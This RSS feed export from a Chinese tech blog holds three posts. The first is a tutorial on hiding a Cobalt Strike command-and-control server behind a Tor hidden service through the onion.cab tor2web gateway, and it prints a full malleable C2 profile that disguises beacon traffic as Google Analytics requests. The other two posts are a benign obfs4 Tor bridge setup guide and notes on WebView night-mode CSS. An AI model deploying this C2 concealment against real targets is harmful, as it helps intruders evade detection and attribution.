<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>技术 &#8211; 有组织在!</title>
	<atom:link href="https://uzzz.org/category/jishu/feed" rel="self" type="application/rss+xml" />
	<link>https://uzzz.org/</link>
	<description></description>
	<lastBuildDate>Mon, 27 May 2019 06:54:07 +0000</lastBuildDate>
	<language>zh-CN</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.2.4</generator>

<image>
	<url>https://uzzz.org/wp-content/uploads/2019/10/cropped-icon-32x32.png</url>
	<title>技术 &#8211; 有组织在!</title>
	<link>https://uzzz.org/</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>【基础篇】————23、隐匿攻击之Tor Fronting</title>
		<link>https://uzzz.org/article/1167.html</link>
				<pubDate>Mon, 27 May 2019 06:54:07 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/1167.html</guid>
				<description><![CDATA[0x01 简介 学习完Domain Fronting之后，又从@vysecurity的文章里学会了一个新的姿势–Tor Fronting,使用Tor Fronting 同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。 0x02 Tor Hidden Services Tor是互联网上用于保护您隐私最有力的工具之一，而Tor Hidde]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div class="htmledit_views" id="content_views">
<h2 id="0x01-简介">0x01 简介</h2>
<p>学习完<a href="https://evi1cg.github.io/archives/Domain_Fronting.html" rel="nofollow" data-token="eb107eac0fca4364da40af2938e886c2">Domain Fronting</a>之后，又从<a href="https://twitter.com/vysecurity" rel="nofollow" data-token="5ccde2f1eb2ecb38c54eaf3af0efe8e2">@vysecurity</a>的文章里学会了一个新的姿势–<code>Tor Fronting</code>,使用Tor Fronting<br /> 同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。</p>
<h2 id="0x02-Tor-Hidden-Services">0x02 Tor Hidden Services</h2>
<p>Tor是互联网上用于保护您隐私最有力的工具之一，而Tor Hidden Services则是为了隐藏自己的网站或者其他服务的一个服务。通过此服务，我们可以获取到一个通过Tor Browser来访问的Hostname，此Hostname唯一且匿名，所以我们完全可以使用这个Hostname来为我们转发流量从而达到隐匿的目的。</p>
<p>怎样搭建Tor Hidden Services可以参考此<a href="https://www.torproject.org/docs/tor-hidden-service.html.en" rel="nofollow" data-token="95e911659c63618e646551b0ebcc181a">wiki</a>，下面介绍一下我测试环境的搭建过程。<br /> 环境为：Ubuntu 12.04<br /> 搭建过程如下：<br /> 查看系统信息:</p>
<p>lsb_release -a<br /><img alt="" class="has" height="240" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527144756665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="847"></p>
<p>可以看到Codename为precise，所以在<a href="https://www.torproject.org/docs/debian.html.en#ubuntu" rel="nofollow" data-token="bdd936a67ab3f827137d2d394d965470">这里</a>选择deb类型如下：</p>
<p><img alt="" class="has" height="422" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527144814252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="893"></p>
<p>之后按照官方wiki修改更新源，我的源路径为<code>/etc/apt/sources.list</code>，有的系统更新源路径可能在<code>/etc/apt/sources.list.d/</code>，在源中添加以下条目：</p>
<blockquote>
<p>deb http://deb.torproject.org/torproject.org precise main<br /> deb-src http://deb.torproject.org/torproject.org precise main</p>
</blockquote>
<p><img alt="" class="has" height="285" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527144845444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="907"></p>
<p>之后执行以下命令:</p>
<blockquote>
<p>gpg &#8211;keyserver keys.gnupg.net &#8211;recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89<br /> gpg &#8211;export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add &#8211;</p>
</blockquote>
<p>安装：</p>
<blockquote>
<p>$ sudo apt-get update<br /> $ sudo apt-get install tor deb.torproject.org-keyring</p>
</blockquote>
<p>执行完成以后，就成功安装了，如果出现问题，可以查看一下wiki。</p>
<p>之后要对tor进行一下配置，编辑配置文件<code>/etc/tor/torrc</code>，将以下两个参数前的注释去掉。</p>
<blockquote>
<p>HiddenServiceDir /var/lib/tor/hidden_service/<br /> HiddenServicePort 80 127.0.0.1:8080</p>
</blockquote>
<blockquote>
<p>HiddenServicePort为代理的端口，将本地的8080端口服务转发到80端口。</p>
</blockquote>
<p>配置完成以后对Tor服务进行重启：</p>
<blockquote>
<pre>
<code class="language-html hljs">sudo service tor restart</code></pre>
</blockquote>
<p>查看获取到的hostname:</p>
<blockquote>
<p>sudo cat /var/lib/tor/hidden_service/hostname</p>
</blockquote>
<p><img alt="" class="has" height="83" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019052714501352.png" width="761"></p>
<p>其中<code>xxxxx.onion</code>则为我们的Tor隐藏服务。通过访问这个地址，可以访问到我们服务器8080端口的服务，下面进行一下测试。<br /> 开启8080端口的服务：</p>
<blockquote>
<p><img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/2601.png" alt="☁" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;~ &nbsp;cd /tmp<br /> <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/2601.png" alt="☁" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;~ &nbsp;python -m SimpleHTTPServer 8080<br /> Serving HTTP on 0.0.0.0 port 8080 &#8230;</p>
</blockquote>
<p>使用tor浏览器访问此域名，可看到8080端口的响应：</p>
<p><img alt="" class="has" height="436" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019052714504250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="922"></p>
<h2 id="0x03-Tor2Web">0x03 Tor2Web</h2>
<p>要对这个隐藏server进行利用，需要借助于一个代理，即<a href="https://www.tor2web.org/" rel="nofollow" data-token="681be07496309baccaa7e892f39348bf">tor2web</a>，因为要想访问到隐藏服务，直接通过一般浏览器是不行的，所以，可以借助于tor2web，需要做的也很简单，当我们访问形如<code>http://duskgytldkxiuqc6.onion/</code>的链接时，直接修改<code>.onion</code>成<code>.onion.to</code>或<code>.onion.city</code>&nbsp;或&nbsp;<code>onion.cab</code>&nbsp;或者任何一个提供此服务的域名即可。如下图：</p>
<p><img alt="" class="has" height="310" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145118470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="818"></p>
<p>当然，这里会有一个问题，就是访问的时候，会需要我们点击一个按钮才能正常访问，如下图：</p>
<p><img alt="" class="has" height="431" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145131285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="918"></p>
<p>那么怎么样才能直接访问呢，很简单，只需要带上点击以后的cookie就可以了，测试如下：</p>
<blockquote>
<p>curl -b &#8216;onion_cab_iKnowShit=yourcookie&#8217; &nbsp;&#8216;https://xxxx.onion.cab/1.txt&#8217;</p>
</blockquote>
<p><img alt="" class="has" height="133" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145149374.png" width="887"></p>
<h2 id="0x04-Cobalt-Strike">0x04 Cobalt Strike</h2>
<p>同样的，我们使用Cobalt Strike来进行测试。这里需要配置一个新的profile，@vysecurity已经提供了一个，具体如下：<br /> tor-fronting.profile</p>
<pre class="has">
<code class="language-javascript"># make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker
# Modified by Vincent Yiu @vysecurity for TOR.

set sleeptime "5000";

http-get {
        set uri "/___utm";
        client {
                header "Host" "bjaw6h36vwruhwvb.onion.cab";
                header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d";

                metadata {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }

        server {
                header "Content-Type" "plain/text";

                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

                        print;
                }
        }
}

http-post {
        set uri "/__utm";
        set verb "GET";
        client {
                header "Host" "bjaw6h36vwruhwvb.onion.cab";
                header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d";
                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }

                output {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }

        server {
                header "Content-Type" "plain/text";

                output {
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}

# dress up the staging process too
http-stager {
        server {
                header "Content-Type" "plain/text";
        }
}</code></pre>
<blockquote>
<p>在这里需要注意的是，我们需要修改<code>Get</code>以及<code>Post</code>中的<code>Host</code>及<code>Cookie</code>为自己的。当然，如果你想让数据包呈现别的样子，你也可以自己再写一个profile。</p>
</blockquote>
<p>开启teamserver：</p>
<blockquote>
<p><img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/2601.png" alt="☁" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;cobal &nbsp;sudo ./teamserver [your ip] hacktest tor-fronting.profile</p>
</blockquote>
<p><img alt="" class="has" height="210" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145227653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="909"></p>
<p>连接到Teamserver，之后创建监听：</p>
<p><img alt="" class="has" height="471" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145242605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="684"></p>
<blockquote>
<p>因为onion.cab使用的https，所以我们需要生成一个HTTPS Beacon，Host随意输入一个域名，端口<code>一定要改成443</code>。</p>
</blockquote>
<p>使用<code>onion.cab</code>:</p>
<p><img alt="" class="has" height="349" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145257355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="868"></p>
<p>生成HTTPS Beacon：</p>
<p><img alt="" class="has" height="398" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145308626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="641"></p>
<p>生成HTTPS Beacon以后，要修改监听到8080端口，并且使用HTTP，因为这是tor转发的服务。<br /> 选择Edit：</p>
<p><img alt="" class="has" height="262" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145320974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="914"></p>
<p>修改参数如下：</p>
<p><img alt="" class="has" height="447" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145331810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="646"></p>
<p>保存之后，运行HTTPS beacon，成功上线：</p>
<p><img alt="" class="has" height="637" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019052714534673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="910"></p>
<p>DEMO:</p>
<p><a href="https://www.youtube.com/watch?v=I3ovfrqcF0I" rel="nofollow" data-token="94967ae6e858c926e0c57a74c848a5a7">https://www.youtube.com/watch?v=I3ovfrqcF0I</a></p>
<h2 id="0x05-小结">0x05 小结</h2>
<p>使用Tor Fronting 有以下几个特点：<br /> 1、你<code>不需要外网环境</code>，将C2放到Docker或者本地都可以！（但是需要服务器在墙外）<br /> 2、使C2匿名；<br /> 3、并不需要在目标机上安装Tor；<br /> 4、默认是安全的。<br /> 5、要求C2上同时安装Cobalt Strike及Tor服务。<br /> 通过流量转发来隐藏自己的真正服务器是隐藏的关键，而如何寻找转发和怎么样使用它是很有趣的过程，希望文章能给你有所启发。</p>
<h2 id="0x06-参考">0x06 参考</h2>
<p>1、<a href="https://www.torproject.org/docs/tor-hidden-service.html.en" rel="nofollow" data-token="95e911659c63618e646551b0ebcc181a">https://www.torproject.org/docs/tor-hidden-service.html.en</a><br /> 2、<a href="https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/" rel="nofollow" data-token="dbe6cd363165f8f050b421fb1dd34cb4">https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/</a><br /> 3、<a href="https://secureallthethings.blogspot.co.uk/2016/11/use-tor-use-empire.html" rel="nofollow" data-token="0d21987f7212d34bd6f0cc1745ac1aba">https://secureallthethings.blogspot.co.uk/2016/11/use-tor-use-empire.html</a><br /> 4、<a href="https://www.tor2web.org/" rel="nofollow" data-token="681be07496309baccaa7e892f39348bf">https://www.tor2web.org/</a></p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>centos7.x搭建Tor私人网桥</title>
		<link>https://uzzz.org/article/1189.html</link>
				<pubDate>Mon, 13 May 2019 07:21:24 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/1189.html</guid>
				<description><![CDATA[1. 下载并安装 Tor yum install tor -y 2. 安装 obfs4 通过python进行编译安装： （1）安装 所需依赖软件模块： yum install make automake gcc python-pip python-devel libyaml-devel （2）安装 obfs4proxy： pip install obfspr]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div class="htmledit_views" id="content_views">
<h3>1. 下载并安装 Tor</h3>
<pre class="has">
<code>yum install tor -y</code></pre>
<h3 id="2-安装-obfs4">2. 安装 obfs4</h3>
<p>通过python进行编译安装：</p>
<ul>
<li>（1）安装 所需依赖软件模块：</li>
</ul>
<pre class="has">
<code class="language-bash">yum install make automake gcc python-pip python-devel libyaml-devel</code></pre>
<ul>
<li>（2）安装 obfs4proxy：</li>
</ul>
<pre class="has">
<code class="language-bash">pip install obfsproxy</code></pre>
<p>通过go进行编译安装：</p>
<ul>
<li>（1）下载go的obfs4项目：</li>
</ul>
<pre class="has">
<code class="language-bash">git clone http://www.github.com/Yawning/obfs4</code></pre>
<ul>
<li>
<p>（2）进入obfs4目录进行编译：</p>
</li>
</ul>
<pre class="has">
<code class="language-bash">go build -o obfs4proxy/obfs4proxy ./obfs4proxy</code></pre>
<ul>
<li>（3）复制bofs4proxy到系统工作目录下：</li>
</ul>
<pre class="has">
<code class="language-bash">cp ./obfs4proxy/obfs4proxy /usr/bin/obfs4proxy</code></pre>
<h3 id="3-配置-tor-bridges">3. 配置 Tor Bridges</h3>
<ul>
<li>编辑&nbsp;/etc/tor/torrc：</li>
</ul>
<pre class="has">
<code class="language-bash">vim /etc/tor/torrc</code></pre>
<ul>
<li>定义一个 ORPort，不作为出口节点，设置成 Bridge：</li>
</ul>
<pre class="has">
<code>Log notice file /var/log/tor/notices.log
RunAsDaemon 1
ORPort 4443
Exitpolicy reject *:*
BridgeRelay 1
ServerTransportPlugin obfs4 exec /usr/bin/obfs4proxy
ExtORPort auto
PublishServerDescriptor 0</code></pre>
<ul>
<li>重启tor服务：</li>
</ul>
<pre class="has">
<code class="language-bash">systemctl restart tor</code></pre>
<ul>
<li>
<p>查看tor服务状态</p>
</li>
</ul>
<pre class="has">
<code>systemctl status tor</code></pre>
<h3 id="4-使用网桥">4. 使用网桥</h3>
<ul>
<li>查看日志文件，命令：</li>
</ul>
<pre class="has">
<code>tail -F /var/log/tor/notices.log</code></pre>
<p>内容如下：</p>
<pre class="has">
<code>[notice] Your Tor server's identity key fingerprint is 'Unnamed 530FA95A79B9145D315F15F01215BE2F3BE921EB'
[notice] Your Tor bridge's hashed identity key fingerprint is 'Unnamed 83D1AC9EC2F15D7024278461DC91A8B2E9BBF43A'
[notice] Registered server transport 'obfs4' at '[::]:46396'
[notice] Tor has successfully opened a circuit. Looks like client functionality is working.
[notice] Bootstrapped 100%: Done
[notice] Now checking whether ORPort &lt;redacted&gt;:4443 is reachable... (this may take up to 20 minutes -- look for log messages indicating success)
[notice] Self-testing indicates your ORPort is reachable from the outside. Excellent.</code></pre>
<p>注意：记住输出中 obfs4 监听的端口（本例中是 46396）。并且还能找到你的 server identity fingerprint（本例中是 530FA95A79B9145D315F15F01215BE2F3BE921EB），也复制下来。</p>
<p>在&nbsp;<code>/var/lib/tor/pt_state/obfs4_bridgeline.txt</code>&nbsp;文件中可以看到类似如下的内容：</p>
<pre class="has">
<code>Bridge obfs4 &lt;IP ADDRESS&gt;:&lt;PORT&gt; &lt;FINGERPRINT&gt; cert=oG6a3K7CtearIloUp2OCUk60oNMgw+jVgCNhGumMkODS659UEgRRx7yxZuoEo9Crp9GGXg iat-mode=0
</code></pre>
<ul>
<li>根据日志中的信息获得最终的网桥配置：</li>
</ul>
<pre class="has">
<code>obfs4 &lt;IP ADDRESS&gt;:46396 530FA95A79B9145D315F15F01215BE2F3BE921EB cert=6LMNcXh6MIfApbZiMksnS4Kj+2sffZ5pybSqtcOO5YoHgfrMpkBJqvLxhuR2Ppau0L2seg iatmode=0</code></pre>
<h3>5. 防火墙firewalld放行端口</h3>
<ul>
<li>编辑防火墙公共配置/etc/firewalld/zones/public.xml文件，命令：</li>
</ul>
<pre class="has">
<code>vim /etc/firewalld/zones/public.xml</code></pre>
<p>&nbsp;内容如下(本例ORPort端口 =&gt; 4443, obfs4端口 =&gt; 46396)：</p>
<pre class="has">
<code>&lt;port protocol="tcp" port="ORPort端口"/&gt;
&lt;port protocol="udp" port="ORPort端口"/&gt;
&lt;port protocol="tcp" port="obfs4端口"/&gt;
&lt;port protocol="udp" port="obfs4端口"/&gt;</code></pre>
<ul>
<li>&nbsp;使防火墙配置生效，命令：</li>
</ul>
<pre class="has">
<code>firewall-cmd --complete-reload</code></pre>
<p>&nbsp;</p>
<p><strong>6. 最后附上官方Tor浏览器下载地址</strong></p>
<p><a href="https://www.torproject.org/download/" rel="nofollow" data-token="b63d923088f578fa1571b56ab5f2b347">https://www.torproject.org/download/</a></p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>webview夜间模式适配小结</title>
		<link>https://uzzz.org/article/1401.html</link>
				<pubDate>Fri, 29 Dec 2017 10:46:25 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/1401.html</guid>
				<description><![CDATA[做webview的夜间模式，来来回回折腾了好几天，基本上都是copy网上的各种css代码。 1. 一般实现webview夜间模式，要么就是内核自己实现了这个功能，一个api就能搞定（像uc内核：目前没有实现真正的开放；腾讯x5内核：开放，不知道能不能自定义夜间模式的颜色值之类的）； 2. 要么就是自定义一个html模板，从后台获取json数据，把数据解析出来]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div class="htmledit_views" id="content_views">
<p>做webview的夜间模式，来来回回折腾了好几天，基本上都是copy网上的各种css代码。</p>
<p>1. 一般实现webview夜间模式，要么就是内核自己实现了这个功能，一个api就能搞定（像uc内核：目前没有实现真正的开放；腾讯x5内核：开放，不知道能不能自定义夜间模式的颜色值之类的）；</p>
<p>2. 要么就是自定义一个html模板，从后台获取json数据，把数据解析出来，把各个节点的数据通过js写入到这个模板中，相当于自己在本地组装了一个新的html，丢到webview里面，这样web加载起来也比较快，因为都是一些本地的数据；</p>
<p>3. 再者就是像我这样很无奈的，需要通过js代码向原来的web中注入css代码来改变网页的风格了，说白了就是从后台拿到一个url网页地址，把这个url丢给webview，然后在webview加载完成后注入css代码来改变网页的风格。</p>
<p>用3这种方式最主要的问题就是这个css代码都有些啥，世界上的网页多种多样，要尽可能的适配各种标签，但是也未必能覆盖得全面。对于一个从来没有接触过html，js， css的我来说，着实着急了一把。但是最终还是勉勉强强的实现了这个功能。在这里记录一下新路历程。</p>
<p>首先，去网上搜罗了一堆css代码：</p>
<p><a href="http://blog.csdn.net/hyl0406445/article/details/53034686" rel="nofollow" data-token="2231942fd9386da0f69eccb3495756cc">Android webview设置字体大小，适配屏幕，夜间模式</a>&nbsp; 这篇文章，对主要的标签节点都配置了背景色，这里贴出具体的css代码，注入方法且看原文：</p>
</p>
<pre><code class="language-css">html,body,header,div,a,span,table,tr,td,th,tbody,p,form,input,ul,ol,li,dl,dt,dd,section,footer,nav,h1,h2,h3,h4,h5,h6,em,pre {
	background: #333 !important;
	color: #616161!important;
	border-color: #454530!important;
	text-shadow: 0!important;
	-webkit-text-fill-color: none!important;
}

html a,html a * {
	color: #5a8498!important;
	text-decoration: underline!important;
}

html a:visited,html a:visited *,html a:active,html a:active * {
	color: #505f64!important;
}

html a:hover,html a:hover * {
	color: #cef!important;
}

html input,html select,html button,html textarea {
	background: #4d4c40!important;
	border: 1px solid #5c5a46!important;
	border-top-color: #494533!important;
	border-bottom-color: #494533!important;
}

html input[type=button],html input[type=submit],html input[type=reset],html input[type=image],html button {
	border-top-color: #494533!important;
	border-bottom-color: #494533!important;
}

html input:focus,html select:focus,html option:focus,html button:focus,html textarea:focus {
	background: #5c5b3e!important;
	color: #fff!important;
	border-color: #494100 #635d00 #474531!important;
	outline: 1px solid #041d29!important;
}

html input[type=button]:focus,html input[type=submit]:focus,html input[type=reset]:focus,html input[type=image]:focus,html button:focus {
	border-color: #494533 #635d00 #474100!important;
}

html input[type=radio] {
	background: none!important;
	border-color: #333!important;
	border-width: 0!important;
}

html img[src],html input[type=image] {
	opacity: .5;
}

html img[src]:hover,html input[type=image]:hover {
	opacity: 1;
}

html,html body {
	scrollbar-base-color: #4d4c40 !important;
	scrollbar-face-color: #5a5b3c !important;
	scrollbar-shadow-color: #5a5b3c !important;
	scrollbar-highlight-color: #5c5b3c !important;
	scrollbar-dlight-color: #5c5b3c !important;
	scrollbar-darkshadow-color: #474531 !important;
	scrollbar-track-color: #4d4c40 !important;
	scrollbar-arrow-color: #000 !important;
	scrollbar-3dlight-color: #6a6957 !important;
}

dt a {
	background-color: #333 !important;
}</code></pre>
<p>原文里的代码直接是字符串的，这里使用了<br />
  <a href="http://tool.oschina.net/codeformat/css" rel="nofollow" data-token="d58124de9163d3e2a8f8e15727606035">在线格式化代码</a>格式了一下，这样看起来比较清晰，我自己实现的是新建了一个css文件，把css代码写入这个文件中，然后从文件里面解析出这个css代码（这个后面会给出）。<br />
  <br /> 以上代码主要是设置了各个标签的backgroud和color， 我自己的理解是backgroud是背景色，color是作用到文本上的。但是在我实际使用的过程中，backgroud会把这个标签下的图片隐藏掉，如果我设置了div{backgroud：#颜色} 这个的话，这个article-top-image这个div下的图片就不显示了，猜想可能是它的style=“backgroud”原来应该加载一个图片出来，结果我给设置了颜色值，所以就显示不出来了。解决的办法就是把backgroud换成backgroud-color，也就是只作用backgroud-color。 </p>
<p><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20171229152622435" alt=""></p>
<p>另外这篇文章也是大同小异：<a href="http://blog.csdn.net/xielinhua88/article/details/51435353" rel="nofollow" data-token="d7c818f45edd72a7679587d697305aae">android webView使用js/css实现夜间模式 长按识别图片以及二维码,网页可以上传图片</a></p>
</p>
<pre><code class="language-css">html,body,applet,object,h1,h2,h3,h4,h5,h6,blockquote,pre,abbr,acronym,address,big,cite,code,del,dfn,em,font,img,ins,kbd,q,p,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,th,td {
	background: rgba(0,0,0,0) !important;
	color: #fff !important;
	border-color: #A0A0A0 !important;
}

div,input,button,textarea,select,option,optgroup {
	background-color: #000 !important;
	color: #fff !important;
	border-color: #A0A0A0 !important;
}

a,a * {
	color: #ffffff !important;
	text-decoration: none !important;
	font-weight: bold !important;
	background-color: rgba(0,0,0,0) !important;
}

a:active,a:hover,a:active *,a:hover * {
	color: #1F72D0 !important;
	background-color: rgba(0,0,0,0) !important;
}

p,span {
	font color: #FF0000 !important;
	color: #ffffff !important;
	background-color: rgba(0,0,0,0) !important;
}

html {
	-webkit-filter: contrast(50%);
}</code></pre>
<p>看这里的大多数节点就是使用了backgroud-color属性，并且使用rgba颜色值。对，就是这个rgba中的a解决了我的另一个问题。a代表了透明度。在我的是一个适配的页面中<br />
  <br /> https://www.thestartmagazine.com/article/f0195498-9a5e-4131-a5e1-67136f192bed?ref=TWVpWnUtU0RLJSQlSHlYNFBrZmVIRmRtMUNoN1lGNEw3MTBod004ODU5N0olJCUxMzU3OTg2NDI%3D&amp;recommendationId=TIME_BL&amp;theme=template6&amp;userId=d7451302-3494-4e9c-945c-66d0de7adea4<br />
  </p>
<p>在网页最后有一个资讯列表：</p>
<p><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20171229154908164" alt=""></p>
<p>最开始了我设置：</p>
<pre><code class="language-css">div {
	background-color: #201f26 !important;
}</code></pre>
<p>结果右边的图片就没有了：（为了方便看，我这里设置了另一个颜色：<br />
  <span style="color:rgb(34,34,34);font-family:'dejavu sans mono', monospace;">#e4d5d5）</span> </p>
<p><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20171229155314346" alt=""></p>
<p>其实看其源码，就是一个简单的&lt;div&gt;节点：</p>
<p><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20171229174504746" alt=""></p>
<p>目前尚不清楚为何会出现这个现象。后来无意中把颜色值调整成rgba模式，结果就能显示图片了：</p>
<p><span style="color:rgb(34,34,34);font-family:'dejavu sans mono', monospace;">backgroud-color：rgba(228, 213, 213, 0.27)</span></p>
<p><span style="color:rgb(48,57,66);font-family:'dejavu sans mono', monospace;"><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20171229174810664" alt=""><br /></span></p>
<p><span style="color:rgb(48,57,66);font-family:'dejavu sans mono', monospace;">这里顺便提一下，我们在开发手机网页的时候，可以在chrome中模拟，载入网页的时候，按F12会进入审查元素，右边可以看到html整个网页的源码信息，选择toggle device toolbar可以选择需要的设备信息，然后刷新一下页面就能载入和手机上显示的一致的网页了。</span></p>
<p><span style="color:rgb(48,57,66);font-family:'dejavu sans mono', monospace;"><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20171229175354108" alt=""><br /></span></p>
